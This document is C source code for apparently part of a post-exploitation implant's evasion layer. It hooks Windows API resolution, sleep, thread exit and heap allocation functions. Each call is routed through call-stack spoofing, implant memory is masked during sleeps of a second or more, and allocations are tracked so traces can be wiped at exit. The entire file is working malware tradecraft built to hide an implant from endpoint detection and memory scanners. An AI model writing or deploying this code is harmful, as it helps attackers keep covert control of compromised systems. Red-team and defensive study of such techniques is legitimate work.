#include <windows.h>
#include "memory.h"
#include "mask.h"
#include "spoof.h"
#include "cleanup.h"
#include "tcg.h"

MEMORY_LAYOUT g_memory;

// DECLSPEC_IMPORT VOID   WINAPI KERNEL32$Sleep       ( DWORD );
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$SleepEx     ( DWORD, BOOL );
DECLSPEC_IMPORT VOID   WINAPI KERNEL32$ExitThread  ( DWORD );
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapAlloc   ( HANDLE, DWORD, SIZE_T );
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$HeapFree    ( HANDLE, DWORD, LPVOID );
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$HeapReAlloc ( HANDLE, DWORD, LPVOID, SIZE_T );
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalAlloc  ( UINT, SIZE_T );
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalReAlloc( HLOCAL, SIZE_T, UINT );
DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree   ( HLOCAL );
DECLSPEC_IMPORT void * __cdecl MSVCRT$malloc       ( size_t );
DECLSPEC_IMPORT void * __cdecl MSVCRT$realloc      ( void *, size_t );
DECLSPEC_IMPORT void * __cdecl MSVCRT$calloc       ( size_t, size_t );
DECLSPEC_IMPORT void   __cdecl MSVCRT$free         ( void * );

FARPROC WINAPI _GetProcAddress ( HMODULE hModule, LPCSTR lpProcName )
{
    /* lpProcName may be an ordinal */
    if ( ( ULONG_PTR ) lpProcName >> 16 == 0 )
    {
        /* just resolve normally */
        return GetProcAddress ( hModule, lpProcName );
    }

    FARPROC result = __resolve_hook ( ror13hash ( lpProcName ) );

    /*
     * result may still be NULL if 
     * it wasn't hooked in the spec
     */
    if ( result != NULL ) {
        return result;
    }
    
    return GetProcAddress ( hModule, lpProcName );
}

void setup_hooks ( IMPORTFUNCS * funcs )
{
    funcs->GetProcAddress = ( __typeof__ ( GetProcAddress ) * ) _GetProcAddress;
}

void setup_memory ( MEMORY_LAYOUT * layout )
{
    if ( layout != NULL ) {
        g_memory = * layout;
    }
}

/* 
 * throw these hooks in here because
 * sharing a global across multiple
 * modules is still a bit of a headache
 */

DWORD WINAPI _SleepEx( DWORD dwMilliseconds, BOOL bAlertable )
{
    FUNCTION_CALL call = { 0 };
    DWORD result;

    call.ptr     = ( PVOID ) ( KERNEL32$SleepEx );
    call.argc    = 2;
    call.args[0] = spoof_arg( dwMilliseconds );
    call.args[1] = spoof_arg( bAlertable );  /* pass through; do not force FALSE */

    if ( dwMilliseconds >= 1000 )
        mask_memory( &g_memory, TRUE );

    result = (DWORD)spoof_call( &call );

    if ( dwMilliseconds >= 1000 )
        mask_memory( &g_memory, FALSE );

    return result;
}

VOID WINAPI _ExitThread ( DWORD dwExitCode )
{
    /* free memory */
    cleanup_memory ( &g_memory );

    /* call the real exit thread */
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$ExitThread );
    call.argc = 1;
    
    call.args [ 0 ]  = spoof_arg ( dwExitCode );

    spoof_call ( &call );
}

static void heap_track ( LPVOID addr, SIZE_T size )
{
    if ( addr == NULL || size == 0 || g_memory.Heap.Count >= MAX_HEAP_RECORDS )
        return;

    g_memory.Heap.Records [ g_memory.Heap.Count ].Address = addr;
    g_memory.Heap.Records [ g_memory.Heap.Count ].Size    = size;
    g_memory.Heap.Count++;
}

static void heap_update ( LPVOID old, LPVOID neu, SIZE_T size )
{
    if ( neu == NULL )
        return;

    if ( old != NULL )
    {
        for ( int i = 0; i < g_memory.Heap.Count; i++ )
        {
            if ( g_memory.Heap.Records [ i ].Address == old )
            {
                g_memory.Heap.Records [ i ].Address = neu;
                g_memory.Heap.Records [ i ].Size    = size;
                return;
            }
        }
    }

    heap_track ( neu, size );
}

static void heap_untrack ( LPVOID addr )
{
    if ( addr == NULL )
        return;

    for ( int i = 0; i < g_memory.Heap.Count; i++ )
    {
        if ( g_memory.Heap.Records [ i ].Address == addr )
        {
            int last = ( int ) g_memory.Heap.Count - 1;
            g_memory.Heap.Records [ i ] = g_memory.Heap.Records [ last ];
            g_memory.Heap.Records [ last ].Address = NULL;
            g_memory.Heap.Records [ last ].Size    = 0;
            g_memory.Heap.Count--;
            return;
        }
    }
}

LPVOID WINAPI _HeapAlloc ( HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes )
{
    LPVOID result = NULL;
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$HeapAlloc );
    call.argc = 3;
    call.args [ 0 ] = spoof_arg ( hHeap );
    call.args [ 1 ] = spoof_arg ( dwFlags );
    call.args [ 2 ] = spoof_arg ( dwBytes );

    result = ( LPVOID ) spoof_call ( &call );
    heap_track ( result, dwBytes );
    return result;
}

LPVOID WINAPI _HeapReAlloc ( HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$HeapReAlloc );
    call.argc = 4;
    call.args [ 0 ] = spoof_arg ( hHeap );
    call.args [ 1 ] = spoof_arg ( dwFlags );
    call.args [ 2 ] = spoof_arg ( lpMem );
    call.args [ 3 ] = spoof_arg ( dwBytes );

    LPVOID result = ( LPVOID ) spoof_call ( &call );
    heap_update ( lpMem, result, dwBytes );
    return result;
}

BOOL WINAPI _HeapFree ( HANDLE hHeap, DWORD dwFlags, LPVOID lpMem )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$HeapFree );
    call.argc = 3;
    call.args [ 0 ] = spoof_arg ( hHeap );
    call.args [ 1 ] = spoof_arg ( dwFlags );
    call.args [ 2 ] = spoof_arg ( lpMem );

    BOOL result = ( BOOL ) spoof_call ( &call );
    if ( result )
        heap_untrack ( lpMem );
    return result;
}

HLOCAL WINAPI _LocalAlloc ( UINT uFlags, SIZE_T uBytes )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$LocalAlloc );
    call.argc = 2;
    call.args [ 0 ] = spoof_arg ( uFlags );
    call.args [ 1 ] = spoof_arg ( uBytes );

    HLOCAL result = ( HLOCAL ) spoof_call ( &call );
    heap_track ( result, uBytes );
    return result;
}

HLOCAL WINAPI _LocalReAlloc ( HLOCAL hMem, SIZE_T uBytes, UINT uFlags )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$LocalReAlloc );
    call.argc = 3;
    call.args [ 0 ] = spoof_arg ( hMem );
    call.args [ 1 ] = spoof_arg ( uBytes );
    call.args [ 2 ] = spoof_arg ( uFlags );

    HLOCAL result = ( HLOCAL ) spoof_call ( &call );
    heap_update ( hMem, result, uBytes );
    return result;
}

HLOCAL WINAPI _LocalFree ( HLOCAL hMem )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( KERNEL32$LocalFree );
    call.argc = 1;
    call.args [ 0 ] = spoof_arg ( hMem );

    HLOCAL result = ( HLOCAL ) spoof_call ( &call );
    /* LocalFree returns NULL on success */
    if ( result == NULL )
        heap_untrack ( hMem );
    return result;
}

void * _malloc ( size_t size )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( MSVCRT$malloc );
    call.argc = 1;
    call.args [ 0 ] = spoof_arg ( size );

    void * result = ( void * ) spoof_call ( &call );
    heap_track ( result, size );
    return result;
}

void * _realloc ( void * ptr, size_t size )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( MSVCRT$realloc );
    call.argc = 2;
    call.args [ 0 ] = spoof_arg ( ptr );
    call.args [ 1 ] = spoof_arg ( size );

    void * result = ( void * ) spoof_call ( &call );
    if ( size == 0 )
        heap_untrack ( ptr );
    else
        heap_update ( ptr, result, size );
    return result;
}

void * _calloc ( size_t number, size_t size )
{
    FUNCTION_CALL call = { 0 };
    SIZE_T total = number * size;

    call.ptr  = ( PVOID ) ( MSVCRT$calloc );
    call.argc = 2;
    call.args [ 0 ] = spoof_arg ( number );
    call.args [ 1 ] = spoof_arg ( size );

    void * result = ( void * ) spoof_call ( &call );
    heap_track ( result, total );
    return result;
}

void _free ( void * ptr )
{
    FUNCTION_CALL call = { 0 };

    call.ptr  = ( PVOID ) ( MSVCRT$free );
    call.argc = 1;
    call.args [ 0 ] = spoof_arg ( ptr );

    spoof_call ( &call );
    heap_untrack ( ptr );
}